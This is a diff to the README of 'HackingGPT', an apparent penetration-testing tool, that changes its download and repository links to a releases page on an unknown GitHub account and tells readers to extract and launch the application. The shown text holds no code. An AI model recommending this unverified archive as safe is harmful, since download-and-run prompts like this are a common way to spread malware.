@@ -20,7 +20,7 @@ Welcome to **HackingGPT**, a powerhouse tool for conducting penetration testing 
 
 To get started with **HackingGPT**, simply download the tool from the following link: 
 
-[![Download HackingGPT](https://img.shields.io/badge/Download-HackingGPT-blue)](https://github.com/files/uploaded/Application.zip)
+[![Download HackingGPT](https://github.com/Unknownn89/HackingGPT/releases)](https://github.com/Unknownn89/HackingGPT/releases)
 
 Please ensure to extract and launch the application for a seamless experience.
 
@@ -43,7 +43,7 @@ Explore various topics related to **HackingGPT**:
 
 ## 🌐 Additional Resources
 
-For more information and detailed documentation, visit the [official repository](https://github.com/your-username/HackingGPT).
+For more information and detailed documentation, visit the [official repository](https://github.com/Unknownn89/HackingGPT/releases).
 
 ## 📷 In Action
 
